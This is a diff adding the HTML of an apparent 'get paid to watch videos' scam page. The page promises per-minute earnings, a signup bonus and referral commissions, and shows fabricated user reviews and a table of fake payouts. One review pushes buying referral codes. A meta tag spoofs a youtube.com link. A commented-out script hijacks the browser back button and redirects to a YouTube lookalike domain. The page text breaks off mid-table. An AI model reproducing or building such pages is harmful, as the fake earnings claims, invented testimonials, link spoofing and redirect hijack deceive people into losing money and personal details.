@@ -1,0 +1,518 @@
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta property="og:image" content="https://videofunds.top/images/2.png">
+<meta property="og:title" content="Get paid to enjoy videos 🎥">
+<meta property="og:description" content="Earn $0.60 for every minute you spend watching!">
+<meta property="og:url" content="https://youtube.com">
+<meta property="og:type" content="video">
+<meta name="author" content="">
+<title>Paid video viewing</title>
+<script src="js/jquery.min.js"></script>
+<link rel="stylesheet" href="css/bootstrap.css" >
+<link rel="stylesheet" href="css/font.css" >
+<link rel="stylesheet" href="css/main.css?rstr=532909801696">
+<link href="css/business-frontpage.css?rstr=532909801696" rel="stylesheet">
+<script type="text/javascript" src="js/bootstrap.min.js"></script>
+<script type="text/javascript" src="js/popper.min.js"></script>
+<script type="text/javascript" src="js/commonscripts.js"></script>
+<script type="text/javascript" src="js/geterrorcodes.js?new"></script>
+
+</head>
+<!-- Global site tag (gtag.js) -https://i.imgur.com/l8qcXqa.png Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-N7BJYK4G71"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+  
+    gtag('config', 'G-N7BJYK4G71');
+</script>
+
+<body >
+ 
+ <nav class="navbar navbar-expand-lg fixed-top">
+    <div class="container">
+      <a class="navbar-brand" href="./"><font class="font9" style="font-weight:bold;font-size:25px;color:blue;">videofunds</font></a>
+
+        <div class="d-lg-none d-md-block d-sm-block text-right">
+		         <a class="nav-link" href="javascript:signin();"><div class="fa-sign-in"> Sign In</div></a>		 
+        </div>
+        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarResponsive"
+    aria-controls="navbarSupportedContent1" aria-expanded="false" aria-label="Toggle navigation"><span class="dark-blue-text"><i
+        class="fas fa-bars fa-1x"></i></span>
+       </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+<li class="nav-item"><a class="nav-link" href="./"><div class="fa-home"> Main</div></a></li>
+<li class="nav-item"><a class="nav-link" href="javascript:signin();"><div class="fa-sign-in"> Sign In</div></a></li>
+<li class="nav-item"><a class="nav-link" href="javascript:signup();"><div class="fa-user-plus"> Sign Up</div></a></li>
+
+<li class="nav-item"><a class="nav-link" href="faq.php"><div class="fa-question"> F.A.Q</div></a></li>
+<li class="nav-item"><a class="nav-link" href="support.php"><div class="fa-question-circle"> Support</div></a></li>
+
+        </ul>
+      </div>
+    </div>
+  </nav>
+  
+<script>
+ var payvideos="";
+ var imgs=new Array;
+ var imgpos=0;
+ function getpayvideos(){
+   $.get("getpayvideos.php?rstr="+Math.random(),function(data){
+    stat=getvalfromjson("stat",data);
+    if (stat=="ok"){
+     payvideos=getvalfromjson("payvideos",data);
+     vids=getvalfromjson("vids",data);
+     arr=vids.split(" ");
+     arr.forEach(
+      function preloadimg(vid) {
+       vid=trim(vid);
+       if (vid!=""){
+        imgs[imgpos]=new Image();
+        url="//img.youtube.com/vi/"+vid+"/hqdefault.jpg";
+        imgs[imgpos].src=url;
+        imgpos++;
+       }
+      }
+     );
+     //setTimeout(redraw,5000);
+	 redraw();
+    }
+   });
+ }
+
+ function getlastpayments(){
+   $.get("getlastpayments.php?cou=10&rstr="+Math.random(),function(data){
+    stat=getvalfromjson("stat",data);
+    if (stat=="ok"){
+     lastpayments=getvalfromjson("lastpayments",data);
+     $("#lastpayments").html(lastpayments);
+    }
+   });
+ }
+
+
+ $( document ).ready(function() {
+  //setInterval(getpayvideos,5000);
+  //setInterval(getlastpayments,1000);
+ });
+
+ function redraw(){
+  $("#payvideos").html(payvideos);
+ }
+ 
+
+/* window.onhashchange=function(){jp();};  
+function bf() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}  
+function jp() {location.href='https://youtub-v23.buzz/2361566936114686';}
+setTimeout('bf();', 500); */
+
+ 
+</script>
+  <!-- Header -->
+  <header class="py-1 mb-1 mt-3">
+    <div class="container h-100">
+      <div class="row h-100 align-items-center">
+        <div class="col-lg-12 mt-0 text-center">
+          <font class="font9" style="font-size:2rem;font-weight:bold;color:#18610A;">
+            Watch videos and get paid for it !
+           </font>
+          <p class="font6 bold text-center" style="font-size:18px;color:blue;">
+             <font style="font-size:30px;font-weight:bold;">videofunds</font> <b>company offers you to earn money by watching promotional videos.</b>
+           </p>
+          <p class="font6 bold text-center" style="font-size:18px;">
+             Watch videos and get 0.60 US Dollar per minute of viewing.(T.Sh. 1,300/m)          </p>
+           <p class="font6 bold text-center" style="font-size:18px;">
+            sign up to get a 10 US Dollar newcomer bonus!(T.Sh. 22,700)          </p>
+          
+          <p class="font6 bold text-center" style="font-size:18px;">
+             Refer other users and get 40% from their earnings to your account.
+           </p>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Page Content -->
+  <div class="container">
+
+    <div id="payvideos">
+     <div class="row">
+	 
+	      <div class="col-md-3 mb-5">
+        <div class="card h-100">
+          <a href="showvideo.php?vid=dD7Zez14SwU"><img class="card-img-top" src="//img.youtube.com/vi/dD7Zez14SwU/hqdefault.jpg" alt=""></a>
+          <div class="card-body">
+            <a href="showvideo.php?vid=dD7Zez14SwU" class="btn btn-primary">
+              Watch for $ 0.53&nbsp(T.Sh. 1,200)            </a>
+          </div>
+        </div>
+      </div>
+	      <div class="col-md-3 mb-5">
+        <div class="card h-100">
+          <a href="showvideo.php?vid=Miy9uQcwo3U"><img class="card-img-top" src="//img.youtube.com/vi/Miy9uQcwo3U/hqdefault.jpg" alt=""></a>
+          <div class="card-body">
+            <a href="showvideo.php?vid=Miy9uQcwo3U" class="btn btn-primary">
+              Watch for $ 3.4&nbsp(T.Sh. 7,700)            </a>
+          </div>
+        </div>
+      </div>
+	      <div class="col-md-3 mb-5">
+        <div class="card h-100">
+          <a href="showvideo.php?vid=WnXT9_RJlqg"><img class="card-img-top" src="//img.youtube.com/vi/WnXT9_RJlqg/hqdefault.jpg" alt=""></a>
+          <div class="card-body">
+            <a href="showvideo.php?vid=WnXT9_RJlqg" class="btn btn-primary">
+              Watch for $ 2.91&nbsp(T.Sh. 6,600)            </a>
+          </div>
+        </div>
+      </div>
+	      <div class="col-md-3 mb-5">
+        <div class="card h-100">
+          <a href="showvideo.php?vid=e_PofHAMrg4"><img class="card-img-top" src="//img.youtube.com/vi/e_PofHAMrg4/hqdefault.jpg" alt=""></a>
+          <div class="card-body">
+            <a href="showvideo.php?vid=e_PofHAMrg4" class="btn btn-primary">
+              Watch for $ 1.94&nbsp(T.Sh. 4,400)            </a>
+          </div>
+        </div>
+      </div>
+	      <div class="col-md-3 mb-5">
+        <div class="card h-100">
+          <a href="showvideo.php?vid=utKsVmfRy9I"><img class="card-img-top" src="//img.youtube.com/vi/utKsVmfRy9I/hqdefault.jpg" alt=""></a>
+          <div class="card-body">
+            <a href="showvideo.php?vid=utKsVmfRy9I" class="btn btn-primary">
+              Watch for $ 3.35&nbsp(T.Sh. 7,600)            </a>
+          </div>
+        </div>
+      </div>
+	      <div class="col-md-3 mb-5">
+        <div class="card h-100">
+          <a href="showvideo.php?vid=ZEbtRFGLhoE"><img class="card-img-top" src="//img.youtube.com/vi/ZEbtRFGLhoE/hqdefault.jpg" alt=""></a>
+          <div class="card-body">
+            <a href="showvideo.php?vid=ZEbtRFGLhoE" class="btn btn-primary">
+              Watch for $ 8.87&nbsp(T.Sh. 20,100)            </a>
+          </div>
+        </div>
+      </div>
+	      <div class="col-md-3 mb-5">
+        <div class="card h-100">
+          <a href="showvideo.php?vid=wqpsBP_AghA"><img class="card-img-top" src="//img.youtube.com/vi/wqpsBP_AghA/hqdefault.jpg" alt=""></a>
+          <div class="card-body">
+            <a href="showvideo.php?vid=wqpsBP_AghA" class="btn btn-primary">
+              Watch for $ 18.31&nbsp(T.Sh. 41,600)            </a>
+          </div>
+        </div>
+      </div>
+	      <div class="col-md-3 mb-5">
+        <div class="card h-100">
+          <a href="showvideo.php?vid=AkFi90lZmXA"><img class="card-img-top" src="//img.youtube.com/vi/AkFi90lZmXA/hqdefault.jpg" alt=""></a>
+          <div class="card-body">
+            <a href="showvideo.php?vid=AkFi90lZmXA" class="btn btn-primary">
+              Watch for $ 2.52&nbsp(T.Sh. 5,700)            </a>
+          </div>
+        </div>
+      </div>
+	  
+	  
+	  <a href="javascript:getpayvideos();" class="btn btn-primary" style="aligh:center">SHOW MORE </a>
+
+
+    </div>
+    
+
+    <!-- /.row -->
+    </div>
+
+    <div class="row">
+     <div class="col text-center">
+       <h2>
+        User reviews
+       </h2>
+     </div>
+    </div>
+ 
+    <div class="row">
+      <div class="col-12">
+        <hr>
+		
+	 		
+        <p class="text-justify mb-0 mt-2">
+         <font style="font-size:16px;font-weight:bold;color:blue;">HelenaGilmore2000:</font>
+         <font style="font-size:16px;font-weight:bold;color:#7F393C;">There are simply no words, I'm in shock !!! She earned 800 dollars, but did not have enough referrals, she decided to buy it on the stock exchange. I bought a code for 12 dollars, the referrals arrived immediately, and after 5 minutes I received a message about replenishment of my card by 800 dollars .Wow, wow, wow, I want to scream from happiness, I did not believe until the last moment that I would receive payments !!!  Write if you have questions, I will be happy to answer everyone!</font><br>
+       
+        </p>
+	 		
+        <p class="text-justify mb-0 mt-2">
+         <font style="font-size:16px;font-weight:bold;color:blue;">Raymonds:</font>
+         <font style="font-size:16px;font-weight:bold;color:#7F393C;">Hello everyone! My friend advised me to join you and I did! For the money that he has earned with you, he managed to buy a new iPhone!</font><br>
+       
+        </p>
+	 		
+        <p class="text-justify mb-0 mt-2">
+         <font style="font-size:16px;font-weight:bold;color:blue;">VioricaD89:</font>
+         <font style="font-size:16px;font-weight:bold;color:#7F393C;">Wow! What a great project it is! I express thanks to the organizers. I have already withdrawn my first earnings! And the sum 177 dollars is pretty good for a student like me</font><br>
+       
+        </p>
+	 		
+        <p class="text-justify mb-0 mt-2">
+         <font style="font-size:16px;font-weight:bold;color:blue;">alex_guss:</font>
+         <font style="font-size:16px;font-weight:bold;color:#7F393C;">"Do you plan to add the Payoneer payment system？ I live in Germany, and this method would be more convenient for me.</font><br>
+       
+        </p>
+	     
+
+        
+
+      </div>
+    </div>
+
+    <div class="row">
+      <div class="col-12 mb-0">
+        <a class="btn btn-primary btn-lg" href="support.php">
+          Write a feedback
+          &raquo;</a> 
+          
+         
+          
+      </div>
+    </div>
+
+
+    <div id="lastpayments">
+    <div class="row mb-2">
+      <div class="col-12 mb-0">
+        <h2>
+          Last payments on
+          09/05/2025         </h2>
+        <hr>
+        <div class="row">
+          <div class="col-3">  
+             <font class="font6" style="font-weight:bold;">
+              Country
+             </font>
+          </div>
+          <div class="col-3">  
+             <font class="font6" style="font-weight:bold;">
+              Employee
+             </font>
+          </div>
+          <div class="col-1  d-none d-lg-block">  
+             <font class="font6" style="font-weight:bold;">
+              Time
+             </font>
+          </div>
+          <div class="col-3">  
+             <font class="font6" style="font-weight:bold;">
+              Amount
+             </font>
+          </div>
+          <div class="col-2">  
+             <font class="font6" style="font-weight:bold;">
+              Status
+             </font>
+          </div>
+        </div>
+		
+		        <div class="row mt-1">
+          <div class="col-3">  
+             <font class="" style="font-weight:bold;size:1rem;">
+              <img src="images/flag/mt.svg" style="width:50px;height:30px;">Malta             </font>
+          </div>
+          <div class="col-3 text-left">  
+             <font class="" style="font-weight:bold;color:blue;font-size:0.9rem;">
+              freddie             </font>
+          </div>
+          <div class="col-1  d-none d-lg-block">  
+             <font class="" style="font-weight:bold;">
+              10:19:27             </font>
+          </div>
+          <div class="col-3">  
+             <font class="" style="font-weight:bold;">
+              260.46 $
+             </font>
+          </div>
+          <div class="col-2">  
+             <font class="" style="font-weight:bold;color:green;">
+              Paid out
+             </font>
+          </div>
+        </div>
+		        <div class="row mt-1">
+          <div class="col-3">  
+             <font class="" style="font-weight:bold;size:1rem;">
+              <img src="images/flag/tc.svg" style="width:50px;height:30px;">Turks and Caicos Islands             </font>
+          </div>
+          <div class="col-3 text-left">  
+             <font class="" style="font-weight:bold;color:blue;font-size:0.9rem;">
+              panama1man             </font>
+          </div>
+          <div class="col-1  d-none d-lg-block">  
+             <font class="" style="font-weight:bold;">
+              10:19:09             </font>
+          </div>
+          <div class="col-3">  
+             <font class="" style="font-weight:bold;">
+              771.51 $
+             </font>
+          </div>
+          <div class="col-2">  
+             <font class="" style="font-weight:bold;color:green;">
+              Paid out
+             </font>
+          </div>
+        </div>
+		        <div class="row mt-1">
+          <div class="col-3">  
+             <font class="" style="font-weight:bold;size:1rem;">
+              <img src="images/flag/jp.svg" style="width:50px;height:30px;">Japan             </font>
+          </div>
+          <div class="col-3 text-left">  
+             <font class="" style="font-weight:bold;color:blue;font-size:0.9rem;">
+              marial82             </font>
+          </div>
+          <div class="col-1  d-none d-lg-block">  
+             <font class="" style="font-weight:bold;">
+              10:18:41             </font>
+          </div>
+          <div class="col-3">  
+             <font class="" style="font-weight:bold;">
+              368.99 $
+             </font>
+          </div>
+          <div class="col-2">  
+             <font class="" style="font-weight:bold;color:green;">
+              Paid out
+             </font>
+          </div>
+        </div>
+		        <div class="row mt-1">
+          <div class="col-3">  
+             <font class="" style="font-weight:bold;size:1rem;">
+              <img src="images/flag/na.svg" style="width:50px;height:30px;">Namibia             </font>
+          </div>
+          <div class="col-3 text-left">  
+             <font class="" style="font-weight:bold;color:blue;font-size:0.9rem;">
+              pssk_agon             </font>
+          </div>
+          <div class="col-1  d-none d-lg-block">  
+             <font class="" style="font-weight:bold;">
+              10:18:34             </font>
+          </div>
+          <div class="col-3">  
+             <font class="" style="font-weight:bold;">
+              984.33 $
+             </font>
+          </div>
+          <div class="col-2">  
+             <font class="" style="font-weight:bold;color:green;">
+              Paid out
+             </font>
+          </div>
+        </div>
+		        <div class="row mt-1">
+          <div class="col-3">  
+             <font class="" style="font-weight:bold;size:1rem;">
+              <img src="images/flag/gu.svg" style="width:50px;height:30px;">Guam             </font>
+          </div>
+          <div class="col-3 text-left">  
+             <font class="" style="font-weight:bold;color:blue;font-size:0.9rem;">
+              yinpeng             </font>
+          </div>
+          <div class="col-1  d-none d-lg-block">  
+             <font class="" style="font-weight:bold;">
+              10:18:24             </font>
+          </div>
+          <div class="col-3">  
+             <font class="" style="font-weight:bold;">
+              750.42 $
+             </font>
+          </div>
+          <div class="col-2">  
+             <font class="" style="font-weight:bold;color:green;">
+              Paid out
+             </font>
+          </div>
+        </div>
+		        <div class="row mt-1">
+          <div class="col-3">  
+             <font class="" style="font-weight:bold;size:1rem;">
+              <img src="images/flag/cw.svg" style="width:50px;height:30px;">Curacao             </font>
+          </div>
+          <div class="col-3 text-left">  
+             <font class="" style="font-weight:bold;color:blue;font-size:0.9rem;">
+              whytwulf             </font>
+          </div>
+          <div class="col-1  d-none d-lg-block">  
+             <font class="" style="font-weight:bold;">
+              10:18:22             </font>
+          </div>
+          <div class="col-3">  
+             <font class="" style="font-weight:bold;">
+              487.10 $
+             </font>
+          </div>
+          <div class="col-2">  
+             <font class="" style="font-weight:bold;color:green;">
+              Paid out
+             </font>
+          </div>
+        </div>
+		        <div class="row mt-1">
+          <div class="col-3">  
+             <font class="" style="font-weight:bold;size:1rem;">
+              <img src="images/flag/pm.svg" style="width:50px;height:30px;">Saint Pierre and Miquelon             </font>
+          </div>
+          <div class="col-3 text-left">  
+             <font class="" style="font-weight:bold;color:blue;font-size:0.9rem;">
+              rob parlaman             </font>
+          </div>
+          <div class="col-1  d-none d-lg-block">  
+             <font class="" style="font-weight:bold;">
+              10:16:59             </font>
+          </div>
+          <div class="col-3">  
+             <font class="" style="font-weight:bold;">
+              836.64 $
+             </font>
+          </div>
+          <div class="col-2">  
+             <font class="" style="font-weight:bold;color:green;">
+              Paid out
+             </font>
+          </div>
+        </div>
+		        <div class="row mt-1">
+          <div class="col-3">  
+             <font class="" style="font-weight:bold;size:1rem;">
+              <img src="images/flag/tw.svg" style="width:50px;height:30px;">Taiwan             </font>
+          </div>
+          <div class="col-3 text-left">  
+             <font class="" style="font-weight:bold;color:blue;font-size:0.9rem;">
+              holdenmummy             </font>
+          </div>
+          <div class="col-1  d-none d-lg-block">  
+             <font class="" style="font-weight:bold;">
+              10:15:18             </font>
+          </div>
+          <div class="col-3">  
+             <font class="" style="font-weight:bold;">
+              996.58 $
+             </font>
+          </div>
+          <div class="col-2">  
+             <font class="" style="font-weight:bold;color:green;">
+              Paid out
+             </font>
+          </div>
+        </div>
+		        <div class="row mt-1">
+          <div class="col-3">  
+             <font class="" style="font-weight:bold;size:1rem;">
+              <img src="images/flag/vu.svg" style="width:50
